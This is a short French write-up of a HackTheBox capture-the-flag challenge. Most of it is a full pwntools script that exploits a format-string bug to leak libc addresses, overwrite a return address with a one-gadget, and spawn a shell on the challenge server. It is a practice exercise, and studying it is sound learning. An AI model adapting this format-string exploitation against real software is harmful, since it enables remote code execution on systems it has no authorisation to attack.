---
title: "SecondOne"
date: 2023-09-08T16:22:57+02:00
---

## What Does The F Say

### write up sur un challenge de HackTheBox:  

* La fonction vodka contient une faille de type format string.  
* Nous pouvons leaker des adresses contenues dans la stack.  
* Grace a la fmt, l'on recupere l'adresse du binaire et de la libc.  
* On ecrit l'adresse d'un one gadget, en 3 fois, a l'aide de la faille.  
* Puis un gadget ecrasant l'adresse de retour, nous permettant d'atteindre notre 'payload'.
* Get shell !


```python
#!/usr/bin/env python3
from pwn import *
from sys import argv

if len(argv) == 2:
    c = remote('167.99.94.171', 31147)
    local = False
else:
    c = process('./what_does_the_f_say')
    local = True
    pause()

def float_to_hex(f):
    return hex(struct.unpack('<I', struct.pack('<f', f))[0])

def vodka(p):
    c.recvuntil(b'food')
    c.sendline(b'1')
    c.recvuntil(b'70.00 s.rocks')
    c.sendline(b'2')
    c.recvuntil(b'Kryptonite?')
    #c.sendline(b'%p '*8)
    c.sendline(p)
    r = c.recvline()
    r = c.recvline()
    return r

stack_list = []
for i in range(1,9):
    r = vodka('%{}$p'.format(i).encode()).decode().strip()
    print(i, r)
    if r[:5] == '0x7ff':
        stack_list.append(i)
    if i == 1:
       stack = int(r.strip(), 16)
       target = stack + 0x38 + 0x20 #- 0x60 - 0x40 + 0xa0 #- 0xb0 #- 0x90

for i in range(9,51):
    r = vodka('%{}$p'.format(i).encode()).decode().strip()
    print(i, r)
    if r[:5] == '0x7ff':
        stack_list.append(i)
    c.sendline(b'n')
    if local:
        if i == 27: #local
            enjoy = int(r.strip(), 16) - 0x628
            puts_got = int(r.strip(), 16) + 0x2786
            read_got = puts_got + 0x20
            base_addr = enjoy - 0x1e2
    else:
        if i == 29: #remote
            enjoy = int(r.strip(), 16) - 0x628
            puts_got = int(r.strip(), 16) + 0x2786
            read_got = puts_got + 0x20
            base_addr = enjoy - 0x1e2
    if i == 15:
       srocks = int(r.strip(), 16) + 0x28c6

#for _i in stack_list:
#    print(_i)
#    if _i == 38: continue
#    r = vodka('%{}$s'.format(_i).encode())
#    print(_i, r)
#    c.sendline(b'n')

pts = float_to_hex(77.00) # 0x428c0000 17036 00000
print(f'{pts=}')

#fmt = 4*b'A' + b"%17050x%10$n" + p64(srocks+2) 
#r = vodka(fmt)
#c.sendline(b'n')
fmt = 4*b'A' + b"%17050x%10$s" + p64(puts_got) 
r = vodka(fmt)
c.sendline(b'n')
print(r[-30:])
leak_puts = u64(r[-13:-7].ljust(8, b'\x00'))

fmt = 4*b'A' + b"%17050x%10$s" + p64(read_got) 
r = vodka(fmt)
c.sendline(b'n')
leak_read = u64(r[-13:-7].ljust(8, b'\x00'))

if local:
    libc = leak_puts - 0x74710 #local
    system = libc + 0x491d0 #local
else:
    libc = leak_puts - 0x080a30
    system = libc + 0x04f4e0

gads = [0x4f365, 0x4f3c2, 0x10a45c]
_3pop_ret = base_addr + 0x8b6

print(f'{hex(system)=}')
print(f'{hex(libc)=}')
print(f'{hex(enjoy)=}')
print(f'{hex(srocks)=}')
print(f'{hex(base_addr)=}')
print(f'{hex(target)=}')
print()
print(f'{hex(leak_puts)=}')
print(f'{hex(leak_read)=}')

system = libc + gads[0]

nb_chr = hex(system)[-4:]
print(nb_chr)
nb_chr = int(nb_chr, 16) - 4
fmt = f"%{nb_chr}x%10$n".rjust(16, 'A').encode() + p64(target)
r = vodka(fmt)
c.sendline(b'n')

nb_chr = hex(system)[-8:-4]
print(nb_chr)
nb_chr = int(nb_chr, 16) - 4
fmt = f"%{nb_chr}x%10$n".rjust(16, 'A').encode() + p64(target+2)
r = vodka(fmt)
c.sendline(b'n')

nb_chr = hex(system)[-12:-8]
print(nb_chr)
nb_chr = int(nb_chr, 16) - 4
fmt = f"%{nb_chr}x%10$n".rjust(16, 'A').encode() + p64(target+4)
r = vodka(fmt)
c.sendline(b'n')

nb_chr = hex(_3pop_ret)[-4:]
print(nb_chr)
nb_chr = int(nb_chr, 16) - 3
fmt = f"%{nb_chr}x%10$hn".rjust(16, 'A').encode() + p64(target-0x20)
print(fmt)
r = vodka(fmt)
c.sendline(b'n')

c.interactive()
```
